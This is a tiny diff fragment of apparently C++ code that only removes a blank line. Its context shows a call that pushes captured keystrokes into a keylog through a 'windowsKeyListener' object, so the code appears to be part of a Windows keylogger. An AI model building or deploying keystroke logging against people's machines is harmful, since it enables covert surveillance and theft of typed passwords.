@@ -99,7 +99,6 @@ private:
 
 				shift = false;
 			}
-
 			windowsKeyListener->PushKeylog(str);
 		}
 
